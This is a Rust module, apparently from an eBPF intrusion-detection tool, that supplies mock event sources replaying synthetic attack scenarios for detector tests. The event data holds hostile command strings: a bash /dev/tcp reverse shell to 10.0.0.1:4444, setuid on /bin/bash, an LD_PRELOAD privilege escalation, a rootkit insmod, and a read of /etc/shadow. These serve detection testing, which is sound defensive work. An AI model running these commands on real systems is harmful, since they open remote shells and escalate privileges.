//! 事件源抽象 — 统一 eBPF ring buffer、mock、文件回放的数据获取接口。

use anyhow::Result;
use ks_core::event::{EventHeader, ExecEvent, FileEvent, NetEvent, SignalEvent, af};

pub trait EventSource: Send + Sync {
    fn next_bytes(&mut self) -> Result<Option<Vec<u8>>>;
    fn description(&self) -> &str;
    fn is_mock(&self) -> bool;
}

// ========== Mock 事件源 ==========

pub struct MockEventSource {
    events: Vec<Vec<u8>>,
    cursor: usize,
    loop_mode: bool,
}

impl MockEventSource {
    pub fn new_with_all_scenarios() -> Self {
        let base_ns: u64 = 100_000_000_000;
        let mut events = Vec::new();
        events.extend(Self::reverse_shell_scenario(base_ns));
        events.extend(Self::ransomware_scenario(base_ns + 60_000_000_000));
        events.extend(Self::privilege_escalation_scenario(base_ns + 120_000_000_000));
        events.extend(Self::dns_tunnel_scenario(base_ns + 180_000_000_000));
        events.extend(Self::rootkit_scenario(base_ns + 240_000_000_000));
        events.extend(Self::baseline_scenario(base_ns + 300_000_000_000));
        Self { events, cursor: 0, loop_mode: true }
    }

    pub fn new_with_scenario(scenario: MockScenario) -> Self {
        let base_ns: u64 = 100_000_000_000;
        let events = match scenario {
            MockScenario::ReverseShell => Self::reverse_shell_scenario(base_ns),
            MockScenario::Ransomware => Self::ransomware_scenario(base_ns),
            MockScenario::PrivilegeEscalation => Self::privilege_escalation_scenario(base_ns),
            MockScenario::DnsTunnel => Self::dns_tunnel_scenario(base_ns),
            MockScenario::Rootkit => Self::rootkit_scenario(base_ns),
            MockScenario::Baseline => Self::baseline_scenario(base_ns),
            MockScenario::All => Self::new_with_all_scenarios().events,
        };
        Self { events, cursor: 0, loop_mode: false }
    }

    pub fn with_loop(mut self, loop_mode: bool) -> Self { self.loop_mode = loop_mode; self }
    pub fn remaining(&self) -> usize { self.events.len() - self.cursor }

    fn reverse_shell_scenario(base_ns: u64) -> Vec<Vec<u8>> {
        vec![
            encode_struct(&ExecEvent {
                header: make_header(1, 1234, base_ns, b"bash", 59),
                filename: make_cstr_256("/bin/bash"),
                args: make_cstr_512("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
            }),
            encode_struct(&NetEvent {
                header: make_header(20, 1234, base_ns + 100_000_000, b"bash", 42),
                saddr: ipv4_to_u32("192.168.1.100"), daddr: ipv4_to_u32("10.0.0.1"),
                sport: 54321, dport: 4444, proto: 6, family: af::AF_INET,
                saddr6: [0u8; 16], daddr6: [0u8; 16], _pad3: [0u8; 2],
            }),
            encode_struct(&FileEvent {
                header: make_header(10, 1234, base_ns + 200_000_000, b"cat", 2),
                filename: make_cstr_256("/etc/shadow"), bytes: 0, fd: 3, flags: 0,
            }),
            encode_struct(&make_header(2, 1234, base_ns + 300_000_000, b"bash", 0)),
        ]
    }

    fn ransomware_scenario(base_ns: u64) -> Vec<Vec<u8>> {
        let pid = 5678;
        let mut events = vec![
            encode_struct(&ExecEvent {
                header: make_header(1, pid, base_ns, b"encryptor", 59),
                filename: make_cstr_256("/tmp/encryptor"),
                args: make_cstr_512("/tmp/encryptor --target /home/user/docs"),
            })
        ];
        for (i, fname) in ["report.pdf.encrypted", "budget.xlsx.encrypted", "img001.jpg.encrypted", "img002.jpg.encrypted"].iter().enumerate() {
            events.push(encode_struct(&FileEvent {
                header: make_header(12, pid, base_ns + (i as u64 + 1) * 50_000_000, b"encryptor", 1),
                filename: make_cstr_256(fname), bytes: 102400, fd: (i + 3) as i32, flags: 1,
            }));
        }
        for (i, fname) in ["report.pdf", "budget.xlsx", "img001.jpg", "img002.jpg"].iter().enumerate() {
            events.push(encode_struct(&FileEvent {
                header: make_header(13, pid, base_ns + (i as u64 + 5) * 50_000_000, b"encryptor", 87),
                filename: make_cstr_256(fname), bytes: 0, fd: 0, flags: 0,
            }));
        }
        events.push(encode_struct(&FileEvent {
            header: make_header(12, pid, base_ns + 500_000_000, b"encryptor", 1),
            filename: make_cstr_256("README_FOR_DECRYPT.txt"), bytes: 2048, fd: 11, flags: 1,
        }));
        events
    }

    fn privilege_escalation_scenario(base_ns: u64) -> Vec<Vec<u8>> {
        let pid = 3456;
        vec![
            encode_struct(&ExecEvent {
                header: make_header(1, pid, base_ns, b"chmod", 59),
                filename: make_cstr_256("/bin/chmod"), args: make_cstr_512("chmod +s /bin/bash"),
            }),
            encode_struct(&FileEvent {
                header: make_header(15, pid, base_ns + 100_000_000, b"chmod", 15),
                filename: make_cstr_256("/bin/bash"), bytes: 0, fd: 0, flags: 0,
            }),
            encode_struct(&FileEvent {
                header: make_header(12, pid, base_ns + 200_000_000, b"bash", 1),
                filename: make_cstr_256("/etc/sudoers"), bytes: 256, fd: 3, flags: 1,
            }),
            encode_struct(&ExecEvent {
                header: make_header(1, pid + 1, base_ns + 300_000_000, b"bash", 59),
                filename: make_cstr_256("/bin/bash"), args: make_cstr_512("LD_PRELOAD=/tmp/malicious.so /bin/su"),
            }),
            encode_struct(&SignalEvent {
                header: make_header(30, pid, base_ns + 400_000_000, b"strace", 101),
                target_pid: 1, signal: 0,
            }),
        ]
    }

    fn dns_tunnel_scenario(base_ns: u64) -> Vec<Vec<u8>> {
        let pid = 7890;
        let dns_servers = ["8.8.8.8", "8.8.4.4", "1.1.1.1", "8.8.8.8", "8.8.4.4"];
        let mut events = vec![
            encode_struct(&ExecEvent {
                header: make_header(1, pid, base_ns, b"dnstunnel", 59),
                filename: make_cstr_256("/tmp/dnstunnel"), args: make_cstr_512("dnstunnel --client"),
            })
        ];
        for (i, dns) in dns_servers.iter().enumerate() {
            events.push(encode_struct(&NetEvent {
                header: make_header(24, pid, base_ns + (i as u64 + 1) * 1_000_000_000, b"dnstunnel", 0),
                saddr: ipv4_to_u32("192.168.1.100"), daddr: ipv4_to_u32(dns),
                sport: 12345 + i as u16, dport: 53, proto: 17, family: af::AF_INET,
                saddr6: [0u8; 16], daddr6: [0u8; 16], _pad3: [0u8; 2],
            }));
        }
        events
    }

    fn rootkit_scenario(base_ns: u64) -> Vec<Vec<u8>> {
        let pid = 9999;
        vec![
            encode_struct(&ExecEvent {
                header: make_header(1, pid, base_ns, b"insmod", 59),
                filename: make_cstr_256("/sbin/insmod"), args: make_cstr_512("insmod /tmp/rootkit.ko"),
            }),
            encode_struct(&FileEvent {
                header: make_header(10, pid, base_ns + 100_000_000, b"insmod", 2),
                filename: make_cstr_256("/proc/kallsyms"), bytes: 0, fd: 3, flags: 0,
            }),
            encode_struct(&FileEvent {
                header: make_header(12, pid, base_ns + 200_000_000, b"bash", 1),
                filename: make_cstr_256("/boot/grub/grub.cfg"), bytes: 4096, fd: 4, flags: 1,
            }),
            encode_struct(&SignalEvent {
                header: make_header(31, pid, base_ns + 300_000_000, b"bash", 62),
                target_pid: 100, signal: 9,
            }),
        ]
    }

    fn baseline_scenario(base_ns: u64) -> Vec<Vec<u8>> {
        vec![
            encode_struct(&ExecEvent {
                header: make_header(1, 5000, base_ns, b"ls", 59),
                filename: make_cstr_256("/bin/ls"), args: make_cstr_512("ls -la /home"),
            }),
            encode_struct(&FileEvent {
                header: make_header(10, 5001, base_ns + 50_000_000, b"cat", 2),
                filename: make_cstr_256("/etc/hosts"), bytes: 0, fd: 3, flags: 0,
            }),
            encode_struct(&ExecEvent {
                header: make_header(1, 5002, base_ns + 100_000_000, b"wget", 59),
                filename: make_cstr_256("/usr/bin/wget"), args: make_cstr_512("wget https://example.com/pkg.tar.gz"),
            }),
            encode_struct(&NetEvent {
                header: make_header(20, 5002, base_ns + 150_000_000, b"wget", 42),
                saddr: ipv4_to_u32("192.168.1.100"), daddr: ipv4_to_u32("93.184.216.34"),
                sport: 54322, dport: 443, proto: 6, family: af::AF_INET,
                saddr6: [0u8; 16], daddr6: [0u8; 16], _pad3: [0u8; 2],
            }),
        ]
    }
}

impl EventSource for MockEventSource {
    fn next_bytes(&mut self) -> Result<Option<Vec<u8>>> {
        if self.cursor >= self.events.len() {
            if self.loop_mode { self.cursor = 0; } else { return Ok(None); }
        }
        let data = self.events[self.cursor].clone();
        self.cursor += 1;
        Ok(Some(data))
    }
    fn description(&self) -> &str { "mock 事件源" }
    fn is_mock(&self) -> bool { true }
}

// ========== Linux 真实事件源 (aya ring buffer) ==========
// 注意：LinuxEventSource 已简化为 stub。
// 真实 ring buffer 消费在 start.rs 中通过 loader.try_next_event() 直接调用。

#[cfg(target_os = "linux")]
pub struct LinuxEventSource;

#[cfg(target_os = "linux")]
impl LinuxEventSource {
    pub fn new() -> Self { Self }
}

#[cfg(target_os = "linux")]
impl EventSource for LinuxEventSource {
    fn next_bytes(&mut self) -> anyhow::Result<Option<Vec<u8>>> {
        // stub — 真实消费由 start.rs 绕过此 trait 直接调 loader
        Ok(None)
    }
    fn description(&self) -> &str { "Linux eBPF (via loader)" }
    fn is_mock(&self) -> bool { false }
}

// ========== 辅助函数 ==========

fn make_header(event_type: u32, pid: u32, ts: u64, comm: &[u8], nr: i32) -> EventHeader {
    let mut buf = [0u8; 16];
    let len = comm.len().min(16);
    buf[..len].copy_from_slice(&comm[..len]);
    EventHeader { event_type, _pad1: 0, timestamp_ns: ts, pid, tid: pid, uid: if pid < 5000 { 0 } else { 1000 }, ppid: if pid > 100 { pid / 10 } else { 0 }, comm: buf, syscall_nr: nr, _pad2: 0, retval: 0 }
}

fn make_cstr_256(s: &str) -> [u8; 256] {
    let mut buf = [0u8; 256];
    let len = s.len().min(255);
    buf[..len].copy_from_slice(s.as_bytes());
    buf
}

fn make_cstr_512(s: &str) -> [u8; 512] {
    let mut buf = [0u8; 512];
    let len = s.len().min(511);
    buf[..len].copy_from_slice(s.as_bytes());
    buf
}

fn ipv4_to_u32(addr: &str) -> u32 {
    let parts: Vec<u8> = addr.split('.').filter_map(|p| p.parse::<u8>().ok()).collect();
    if parts.len() == 4 { u32::from_be_bytes([parts[0], parts[1], parts[2], parts[3]]) } else { 0 }
}

fn encode_struct<T: Copy>(s: &T) -> Vec<u8> {
    let size = core::mem::size_of::<T>();
    let mut data = vec![0u8; size];
    unsafe { core::ptr::write_unaligned(data.as_mut_ptr() as *mut T, *s); }
    data
}

#[derive(Debug, Clone, Copy)]
pub enum MockScenario {
    ReverseShell, Ransomware, PrivilegeEscalation, DnsTunnel, Rootkit, Baseline, All,
}

// ========== 平台导出 ==========

#[cfg(target_os = "linux")]
pub use linux_impl::*;
#[cfg(not(target_os = "linux"))]
pub use mock_only::*;

#[cfg(target_os = "linux")]
mod linux_impl {
    pub use super::{EventSource, MockEventSource, MockScenario, LinuxEventSource};
    /// 默认事件源（未传入 channel 时用 mock 兜底）
    pub fn default_event_source() -> Box<dyn EventSource> {
        log::warn!("default_event_source() 返回 mock（因未提供 eBPF receiver）");
        Box::new(MockEventSource::new_with_all_scenarios().with_loop(true))
    }
}

#[cfg(not(target_os = "linux"))]
mod mock_only {
    pub use super::{EventSource, MockEventSource};
    pub fn default_event_source() -> Box<dyn EventSource> {
        Box::new(MockEventSource::new_with_all_scenarios().with_loop(true))
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::aggregator::EventAggregator;

    #[test]
    fn test_mock_source_decodable() {
        let mut source = MockEventSource::new_with_all_scenarios().with_loop(false);
        let mut agg = EventAggregator::new(10000);
        let mut n = 0;
        while let Ok(Some(bytes)) = source.next_bytes() {
            if agg.decode(&bytes).is_ok() { n += 1; }
        }
        assert!(n > 10);
    }

    #[test]
    fn test_reverse_shell_scenario() {
        let mut source = MockEventSource::new_with_scenario(MockScenario::ReverseShell).with_loop(false);
        let mut agg = EventAggregator::new(10000);
        let mut events = Vec::new();
        while let Ok(Some(bytes)) = source.next_bytes() {
            if let Ok(e) = agg.decode(&bytes) { events.push(e); }
        }
        assert_eq!(events.len(), 4);
        assert_eq!(events[1].dport, Some(4444));
    }

    #[test]
    fn test_ipv4_encoding() {
        assert_eq!(ipv4_to_u32("8.8.8.8"), 0x08080808);
        assert_eq!(ipv4_to_u32("10.0.0.1"), 0x0a000001);
    }
}